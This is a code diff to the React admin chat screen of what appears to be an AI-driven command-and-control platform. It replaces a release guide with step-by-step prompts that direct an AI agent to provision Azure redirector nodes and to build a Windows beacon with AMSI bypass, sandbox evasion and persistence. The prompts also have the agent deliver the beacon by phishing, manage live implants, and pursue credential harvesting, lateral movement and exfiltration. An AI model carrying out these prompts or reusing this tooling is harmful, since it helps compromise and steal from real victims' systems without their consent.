@@ -52,6 +52,7 @@ import {
   Clipboard,
   BarChart3,
   History,
+  Square,
 } from "lucide-react"
 
 /* ------------------------------------------------------------------ */
@@ -113,24 +114,28 @@ type GuideStep = {
   prompt: string
 }
 
-type DeployProfileId = "docker_compose" | "docker" | "node_runtime" | "static"
+type OpProfileId =
+  | "node_setup"
+  | "beacon_build"
+  | "deployment"
+  | "post_exploit"
+  | "monitoring"
 
-type DeployProfileSignal = {
-  id: DeployProfileId
+type OpProfileSignal = {
+  id: OpProfileId
   label: string
   detected: boolean
   evidence: string[]
 }
 
-type DeployGuideContext = {
-  primaryProfile: DeployProfileId
-  profiles: DeployProfileSignal[]
-  scripts: {
-    install: string | null
-    lint: string | null
-    test: string | null
-    build: string | null
-    start: string | null
+type OpGuideContext = {
+  primaryProfile: OpProfileId
+  profiles: OpProfileSignal[]
+  env: {
+    hysteriaConfigured: boolean
+    shadowGrokEnabled: boolean
+    mailConfigured: boolean
+    threatIntelConfigured: boolean
   }
 }
 
@@ -165,116 +170,169 @@ const TOOLS_LIST = [
   { name: "list_payloads", desc: "List payload builds", icon: Clipboard },
   { name: "get_payload_status", desc: "Check build status", icon: CheckCircle2 },
   { name: "delete_payload", desc: "Delete payload artifacts", icon: Trash2 },
+  { name: "list_nodes", desc: "List infrastructure nodes", icon: Terminal },
+  { name: "get_node", desc: "Get node details", icon: Terminal },
+  { name: "create_node", desc: "Register a new node", icon: Terminal },
+  { name: "update_node", desc: "Update node config", icon: Terminal },
+  { name: "delete_node", desc: "Remove a node", icon: Trash2 },
+  { name: "list_beacons", desc: "List active beacons", icon: Zap },
+  { name: "get_beacon", desc: "Get beacon details", icon: Zap },
+  { name: "deploy_node", desc: "Deploy node to cloud", icon: Wrench },
+  { name: "list_deployments", desc: "List active deployments", icon: ListChecks },
+  { name: "get_deployment_status", desc: "Check deployment progress", icon: CheckCircle2 },
+  { name: "list_provider_presets", desc: "Cloud provider presets", icon: Info },
 ]
 
-const DEFAULT_DEPLOY_GUIDE_CONTEXT: DeployGuideContext = {
-  primaryProfile: "node_runtime",
+const DEFAULT_OP_GUIDE_CONTEXT: OpGuideContext = {
+  primaryProfile: "node_setup",
   profiles: [
-    { id: "docker_compose", label: "Docker Compose", detected: false, evidence: [] },
-    { id: "docker", label: "Docker", detected: false, evidence: [] },
-    { id: "node_runtime", label: "Node Runtime", detected: true, evidence: [] },
-    { id: "static", label: "Static Hosting", detected: false, evidence: [] },
+    { id: "node_setup", label: "Node Setup", detected: true, evidence: [] },
+    { id: "beacon_build", label: "Beacon Build", detected: true, evidence: [] },
+    { id: "deployment", label: "Deployment", detected: true, evidence: [] },
+    { id: "post_exploit", label: "Post-Exploitation", detected: true, evidence: [] },
+    { id: "monitoring", label: "Monitoring", detected: true, evidence: [] },
   ],
-  scripts: {
-    install: "npm ci",
-    lint: "npm run lint",
-    test: "npm run test",
-    build: "npm run build",
-    start: "npm run start",
+  env: {
+    hysteriaConfigured: true,
+    shadowGrokEnabled: true,
+    mailConfigured: true,
+    threatIntelConfigured: true,
   },
 }
 
-const DEPLOY_PROFILE_LABELS: Record<DeployProfileId, string> = {
-  docker_compose: "Docker Compose",
-  docker: "Docker",
-  node_runtime: "Node Runtime",
-  static: "Static Hosting",
+const OP_PROFILE_LABELS: Record<OpProfileId, string> = {
+  node_setup: "Node Setup",
+  beacon_build: "Beacon Build",
+  deployment: "Deployment",
+  post_exploit: "Post-Exploitation",
+  monitoring: "Monitoring",
 }
 
-function deployStrategyForProfile(profile: DeployProfileId): string {
+function opStrategyForProfile(profile: OpProfileId): string {
   switch (profile) {
-    case "docker_compose":
-      return "Primary deployment target is Docker Compose. Prefer compose build/up workflows and container-level health checks."
-    case "docker":
-      return "Primary deployment target is a standalone Docker image. Prefer docker build/push/run workflow and registry-based rollout."
-    case "static":
-      return "Primary deployment target is static hosting. Focus on asset build, static output verification, and CDN deployment validation."
-    case "node_runtime":
+    case "node_setup":
+      return "Focus on Hysteria 2 node provisioning, traffic stats API configuration, and client config generation."
+    case "beacon_build":
+      return "Focus on implant compilation, packing (UPX), persistence configuration, and C2 node assignment."
+    case "deployment":
+      return "Focus on payload delivery methods: phishing campaigns, manual delivery, or redirector staging."
+    case "post_exploit":
+      return "Focus on credential harvesting, privilege escalation, lateral movement, and data exfiltration."
+    case "monitoring":
+      return "Focus on beacon health checks, node bandwidth monitoring, OPSEC scoring, and maintenance workflows."
     default:
-      return "Primary deployment target is direct Node runtime. Focus on package scripts, process manager startup, and runtime health checks."
+      return "Focus on end-to-end C2 infrastructure management."
   }
 }
 
 function buildAdaptiveGuideSteps(
-  context: DeployGuideContext,
-  selectedProfile: DeployProfileId,
+  _context: OpGuideContext,
+  selectedProfile: OpProfileId,
 ): GuideStep[] {
-  const profileLabel = DEPLOY_PROFILE_LABELS[selectedProfile]
-  const strategy = deployStrategyForProfile(selectedProfile)
-  const scriptList = [
-    context.scripts.install,
-    context.scripts.lint,
-    context.scripts.test,
-    context.scripts.build,
-  ]
-    .filter(Boolean)
-    .join(" -> ")
+  const profileLabel = OP_PROFILE_LABELS[selectedProfile]
+  const strategy = opStrategyForProfile(selectedProfile)
 
   return [
     {
-      id: "scope",
-      title: "Scope the release",
-      outcome: "Confirm requirements, risks, and deployment checkpoints.",
+      id: "infra",
+      title: "Provision Hysteria 2 Infrastructure on Azure",
+      outcome: "Create and configure Azure-based C2/redirector nodes with monitoring.",
       prompt:
-        `You are my release copilot. Step 1 of a complete build and deployment flow.\n` +
-        `Detected primary deployment profile: ${profileLabel}.\n` +
+        `Step 1 — Provision Azure Infrastructure.\n` +
+        `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Inspect this repository and return: (1) release scope, (2) required environments, (3) prerequisites, (4) go/no-go criteria, and (5) clarifying questions before execution.`,
+        `Execute:\n` +
+        `1. Call list_profiles and list_nodes to inspect current infrastructure.\n` +
+        `2. Call generate_config to create a stealth Hysteria 2 server YAML (obfuscated preset, port 443, masquerade, strong passwords).\n` +
+        `   - Optionally include applyToNodes and sshPrivateKey to apply immediately via SSH.\n` +
+        `3. Call deploy_node to provision a new Azure VPS with:\n` +
+        `   - provider="azure" (required)\n` +
+        `   - resourceGroup="hysteria-rg-eastus" (REQUIRED - must be an existing resource group)\n` +
+        `   - region="eastus" (or westeurope, australiaeast)\n` +
+        `   - name="hysteria-node-eastus-01" (descriptive name)\n` +
+        `   Available resource groups: hysteria-rg-eastus, hysteria-rg-westeurope, hysteria-rg-australiaeast\n` +
+        `4. Call get_deployment_status with the deploymentId to monitor progress.\n` +
+        `5. Once deployment completes, call analyze_traffic to verify the new node reports health metrics.\n` +
+        `Return the deployment ID, node ID, Azure region, VM name, public IP, and any auth credentials generated.`,
     },
     {
-      id: "env",
-      title: "Prepare environment and secrets",
-      outcome: "Create a validated environment and secret matrix.",
+      id: "apply-config",
+      title: "Apply Config to Existing Nodes",
+      outcome: "Push Hysteria2 config to remote nodes via SSH (two methods).",
       prompt:
-        `Step 2 of the release flow for ${profileLabel}.\n` +
-        `Build a full environment matrix for local/staging/production based on this repo's code and config.\n` +
-        `Return required env vars, source of truth for each, validation checks, and a red/yellow/green readiness status per environment.`,
-    },
-    {
-      id: "build",
-      title: "Build and quality gates",
-      outcome: "Run deterministic quality gates before deployment.",
-      prompt:
-        `Step 3 of the release flow for ${profileLabel}.\n` +
-        `Use the repository's real scripts/tools and provide an executable gate checklist.\n` +
-        `Preferred sequence from detected scripts: ${scriptList || "install -> lint -> test -> build"}.\n` +
-        `For each gate, include: command, expected output, fail triage, and pass criteria.`,
-    },
-    {
-      id: "staging",
-      title: "Deploy to staging",
-      outcome: "Execute safe staging rollout with smoke tests.",
-      prompt:
-        `Step 4 of the release flow for ${profileLabel}.\n` +
+        `Step 2 — Apply Config via SSH.\n` +
+        `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Provide a staging runbook with exact commands, migration handling, smoke-test checklist, and rollback path. Pause for explicit confirmation before risky actions.`,
+        `Method A - Generate & Apply in One Step:\n` +
+        `1. Call generate_config with applyToNodes=["node-id-1", "node-id-2"] and sshPrivateKey.\n` +
+        `2. The config is generated AND pushed to nodes automatically, with service restart.\n` +
+        `Method B - Apply Existing Profile:\n` +
+        `1. Call list_profiles to select the config profile to apply.\n` +
+        `2. Call list_nodes to identify target nodes with SSH credentials.\n` +
+        `3. For each target node, call apply_node_config with: nodeId, profileId, sshPrivateKey, restartService=true.\n` +
+        `4. Verify by calling get_node to confirm profileId was updated and status is healthy.\n` +
+        `Return: which configs were applied, which nodes succeeded/failed, and service restart status.`,
     },
     {
-      id: "production",
-      title: "Deploy to production",
-      outcome: "Execute controlled production rollout and rollback safety.",
+      id: "beacon",
+      title: "Build Beacon / Implant",
+      outcome: "Compile and pack a stealth beacon for the target OS.",
       prompt:
-        `Step 5 of the release flow for ${profileLabel}.\n` +
-        `Create a controlled production rollout plan with checkpoints, health criteria, rollback triggers, and communication updates.\n` +
-        `Include command-by-command execution and verification order.`,
+        `Step 3 — Build Beacon.\n` +
+        `Profile: ${profileLabel}.\n` +
+        `${strategy}\n` +
+        `Execute:\n` +
+        `1. Call list_nodes to pick the best C2 node for callbacks (prefer online nodes with good latency).\n` +
+        `2. Call generate_payload to build a Windows x64 beacon (UPX level 7, 45–90 min jitter, scheduled-task persistence, sandbox evasion, AMSI bypass).\n` +
+        `3. Call get_payload_status with the build ID to confirm the build succeeded and get the download URL.\n` +
+        `Return the beacon build ID, SHA-256 hash, and download link.`,
     },
     {
-      id: "post-deploy",
-      title: "Post-deploy verification",
-      outcome: "Close out release with monitoring and summary.",
+      id: "deploy",
+      title: "Deploy Payload",
+      outcome: "Deliver the beacon to target systems and confirm check-in.",
       prompt:
-        `Final step of the release flow for ${profileLabel}.\n` +
-        `Provide a post-deploy checklist for logs/metrics, critical journey checks, watch window, incident triggers, and release summary template for stakeholders.`,
+        `Step 4 — Deploy Payload.\n` +
+        `Profile: ${profileLabel}.\n` +
+        `${strategy}\n` +
+        `Execute:\n` +
+        `1. Call list_payloads to confirm the latest beacon build is ready for deployment.\n` +
+        `2. Call analyze_traffic to check node health and bandwidth before delivery.\n` +
+        `3. Call get_node to retrieve the target node’s subscription/config URL for redirector staging.\n` +
+        `4. Call list_beacons after delivery window to check for new check-ins.\n` +
+        `Return the delivery method chosen (phishing / manual / redirector), staging URLs, and check-in status.`,
+    },
+    {
+      id: "c2",
+      title: "Beacon Monitoring & C2 Operations",
+      outcome: "Maintain situational awareness and manage active beacons.",
+      prompt:
+        `Step 5 — Active C2.\n` +
+        `Profile: ${profileLabel}.\n` +
+        `${strategy}\n` +
+        `Execute:\n` +
+        `1. Call list_beacons to enumerate all active implants and filter by online status.\n` +
+        `2. For each online beacon, call get_beacon with the beacon ID to pull host info, last check-in, and metadata.\n` +
+        `3. Call troubleshoot to run connectivity and OPSEC diagnostics on any stale or unresponsive beacons.\n` +
+        `4. If any beacons are unresponsive, call analyze_traffic on their assigned C2 node to inspect server-side logs.\n` +
+        `Return a status table: beacon ID, hostname, OS, IP, last seen, and recommended next action.`,
+    },
+    {
+      id: "maintain",
+      title: "Monitor, Maintain & Clean Up",
+      outcome: "Keep infrastructure healthy and execute safe operational teardown.",
+      prompt:
+        `Step 6 — Maintenance & Cleanup.\n` +
+        `Profile: ${profileLabel}.\n` +
+        `${strategy}\n` +
+        `Execute:\n` +
+        `1. Call list_nodes and analyze_traffic to audit node bandwidth, connections, and health status.\n` +
+        `2. Call list_beacons and get_beacon to review beacon activity and identify stale implants.\n` +
+        `3. For nodes needing config updates, call update_node to rotate auth credentials or change settings.\n` +
+        `4. Call apply_node_config to push updated configs to remote nodes via SSH (with restartService=true).\n` +
+        `5. Call delete_payload to purge old build artifacts and reduce disk usage.\n` +
+        `6. For retired beacons, use delete_node to remove unused C2 nodes (ensure no active beacons first).\n` +
+        `Return a maintenance report: nodes audited, configs updated, beacons reviewed, artifacts removed.`,
     },
   ]
 }
@@ -352,12 +410,12 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
   const [resourcesTab, setResourcesTab] = useState<"templates" | "tools" | "stats" | "guide">(
     "templates",
   )
-  const [deployGuideContext, setDeployGuideContext] = useState<DeployGuideContext>(
-    DEFAULT_DEPLOY_GUIDE_CONTEXT,
+  const [opGuideContext, setOpGuideContext] = useState<OpGuideContext>(
+    DEFAULT_OP_GUIDE_CONTEXT,
   )
-  const [deployGuideLoading, setDeployGuideLoading] = useState(false)
-  const [selectedDeployProfile, setSelectedDeployProfile] = useState<DeployProfileId>(
-    DEFAULT_DEPLOY_GUIDE_CONTEXT.primaryProfile,
+  const [opGuideLoading, setOpGuideLoading] = useState(false)
+  const [selectedOpProfile, setSelectedOpProfile] = useState<OpProfileId>(
+    DEFAULT_OP_GUIDE_CONTEXT.primaryProfile,
   )
   const [messagesPage, setMessagesPage] = useState(1)
   const [progressEvents, setProgressEvents] = useState<ProgressEvent[]>([])
@@ -367,6 +425,7 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
   const textareaRef = useRef<HTMLTextAreaElement>(null)
   const searchInputRef = useRef<HTMLInputElement>(null)
   const lastRetryRef = useRef<{ prompt: string; clientMessageId: string } | null>(null)
+  const abortControllerRef = useRef<AbortController | null>(null)
 
   const scrollToBottom = useCallback(() => {
     messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
@@ -530,25 +589,25 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
     return () => window.clearTimeout(timer)
   }, [loadInitialData])
 
-  /* ---- Detect deployment profile for adaptive guide ---- */
+  /* ---- Detect operational profile for adaptive guide ---- */
   useEffect(() => {
     const loadGuideContext = async () => {
-      setDeployGuideLoading(true)
+      setOpGuideLoading(true)
       try {
         const res = await apiFetch("/api/admin/ai/deploy-profile")
         if (!res.ok) return
-        const data = (await res.json()) as Partial<DeployGuideContext>
-        if (!data || !data.primaryProfile || !data.profiles || !data.scripts) return
-        setDeployGuideContext({
+        const data = (await res.json()) as Partial<OpGuideContext>
+        if (!data || !data.primaryProfile || !data.profiles) return
+        setOpGuideContext({
           primaryProfile: data.primaryProfile,
           profiles: data.profiles,
-          scripts: data.scripts,
+          env: data.env ?? DEFAULT_OP_GUIDE_CONTEXT.env,
         })
-        setSelectedDeployProfile(data.primaryProfile)
+        setSelectedOpProfile(data.primaryProfile)
       } catch {
         /* keep defaults */
       } finally {
-        setDeployGuideLoading(false)
+        setOpGuideLoading(false)
       }
     }
     loadGuideContext()
@@ -697,6 +756,8 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
     setLoading(true)
     setTimeout(scrollToBottom, 100)
 
+    abortControllerRef.current = new AbortController()
+
     try {
       const res = await apiFetch("/api/admin/ai/chat", {
         method: "POST",
@@ -706,6 +767,7 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
           message: prompt.trim(),
           clientMessageId,
         }),
+        signal: abortControllerRef.current.signal,
       })
 
       const data = (await res.json().catch(() => ({}))) as ChatApiResponse
@@ -734,6 +796,14 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
       lastRetryRef.current = null
       setTimeout(scrollToBottom, 100)
     } catch (err) {
+      if (err instanceof Error && err.name === "AbortError") {
+        // User clicked stop — keep the user message, just clear pending state
+        setMessages((prev) =>
+          prev.map((m) => (m.clientMessageId === clientMessageId ? { ...m, pending: false } : m)),
+        )
+        return
+      }
+
       const errorMessage = err instanceof Error ? err.message : "Request failed"
       setMessages((prev) => prev.filter((m) => m.clientMessageId !== clientMessageId))
       setSendError(errorMessage)
@@ -748,8 +818,14 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
         },
       })
     } finally {
+      abortControllerRef.current = null
       setLoading(false)
     }
+  }
+
+  /* ---- Stop generation ---- */
+  function stopGeneration() {
+    abortControllerRef.current?.abort()
   }
 
   /* ---- Copy helper ---- */
@@ -860,8 +936,8 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
   }, [templates])
 
   const adaptiveGuideSteps = useMemo(
-    () => buildAdaptiveGuideSteps(deployGuideContext, selectedDeployProfile),
-    [deployGuideContext, selectedDeployProfile],
+    () => buildAdaptiveGuideSteps(opGuideContext, selectedOpProfile),
+    [opGuideContext, selectedOpProfile],
   )
 
   /* ---- Tool usage analytics ---- */
@@ -1236,18 +1312,24 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
                 disabled={loading}
                 className="w-full resize-none rounded-xl border border-border/60 bg-background/60 py-3 pl-4 pr-14 text-body-sm leading-relaxed shadow-inner transition-all placeholder:text-muted-foreground/60 focus:border-primary/50 focus:outline-none focus:ring-2 focus:ring-primary/30 disabled:opacity-60"
               />
-              <Button
-                onClick={() => void sendMessage(input)}
-                disabled={loading || !input.trim()}
-                size="icon"
-                className="absolute bottom-2 right-2 h-9 w-9 rounded-lg bg-primary shadow-md shadow-primary/20 hover:bg-primary/90"
-              >
-                {loading ? (
-                  <Loader2 className="h-4 w-4 animate-spin" />
-                ) : (
+              {loading ? (
+                <Button
+                  onClick={stopGeneration}
+                  size="icon"
+                  className="absolute bottom-2 right-2 h-9 w-9 rounded-lg bg-destructive shadow-md shadow-destructive/20 hover:bg-destructive/90"
+                >
+                  <Square className="h-4 w-4 fill-current" />
+                </Button>
+              ) : (
+                <Button
+                  onClick={() => void sendMessage(input)}
+                  disabled={!input.trim()}
+                  size="icon"
+                  className="absolute bottom-2 right-2 h-9 w-9 rounded-lg bg-primary shadow-md shadow-primary/20 hover:bg-primary/90"
+                >
                   <Send className="h-4 w-4" />
-                )}
-              </Button>
+                </Button>
+              )}
             </div>
             <div className="mt-2 flex items-center justify-between text-micro text-muted-foreground/70">
               <span>
@@ -1277,10 +1359,10 @@ export function AiChatView({ hideHeader = false }: { hideHeader?: boolean } = {}
             loading={loading}
             toolUsageStats={toolUsageStats}
             guideSteps={adaptiveGuideSteps}
-            guideProfiles={deployGuideContext.profiles}
-            activeGuideProfile={selectedDeployProfile}
-            onGuideProfileChange={setSelectedDeployProfile}
-            guideLoading={deployGuideLoading}
+            guideProfiles={opGuideContext.profiles}
+            activeGuideProfile={selectedOpProfile}
+            onGuideProfileChange={setSelectedOpProfile}
+            guideLoading={opGuideLoading}
             activeTab={resourcesTab}
             onTabChange={(tab) => setResourcesTab(tab)}
             onClose={() => setShowResources(false)}
@@ -1720,9 +1802,9 @@ function ResourcesRail({
     topTools: { name: string; count: number }[]
   }
   guideSteps: GuideStep[]
-  guideProfiles: DeployProfileSignal[]
-  activeGuideProfile: DeployProfileId
-  onGuideProfileChange: (profile: DeployProfileId) => void
+  guideProfiles: OpProfileSignal[]
+  activeGuideProfile: OpProfileId
+  onGuideProfileChange: (profile: OpProfileId) => void
   guideLoading: boolean
   activeTab: "templates" | "tools" | "stats" | "guide"
   onTabChange: (tab: "templates" | "tools" | "stats" | "guide") => void
@@ -2154,14 +2236,14 @@ function BuildDeployGuide({
   profileLoading,
 }: {
   steps: GuideStep[]
-  profiles: DeployProfileSignal[]
-  activeProfile: DeployProfileId
-  onChangeProfile: (profile: DeployProfileId) => void
+  profiles: OpProfileSignal[]
+  activeProfile: OpProfileId
+  onChangeProfile: (profile: OpProfileId) => void
   sendMessage: (prompt: string) => Promise<void>
   loading: boolean
   profileLoading: boolean
 }) {
-  const activeProfileLabel = DEPLOY_PROFILE_LABELS[activeProfile]
+  const activeProfileLabel = OP_PROFILE_LABELS[activeProfile]
 
   return (
     <div className="space-y-2.5 p-3">
@@ -2171,9 +2253,9 @@ function BuildDeployGuide({
             <ListChecks className="h-3.5 w-3.5" />
           </div>
           <div>
-            <p className="text-body-sm font-medium">Step-by-step build and deployment guide</p>
+            <p className="text-body-sm font-medium">Step-by-step operational guide</p>
             <p className="text-micro text-muted-foreground">
-              Use each full prompt in order to run a complete end-to-end delivery flow.
+              Use each full prompt in order to run a complete end-to-end C2 operational flow.
             </p>
           </div>
         </div>
@@ -2202,7 +2284,7 @@ function BuildDeployGuide({
         </div>
         <p className="mt-1 text-[10px] text-muted-foreground/70">
           Active profile: <span className="font-medium text-foreground/90">{activeProfileLabel}</span>
-          {profileLoading ? " · detecting repository config…" : ""}
+          {profileLoading ? " · detecting operational config…" : ""}
         </p>
         {profiles.find((p) => p.id === activeProfile)?.evidence?.length ? (
           <p className="mt-1 text-[10px] text-muted-foreground/70">
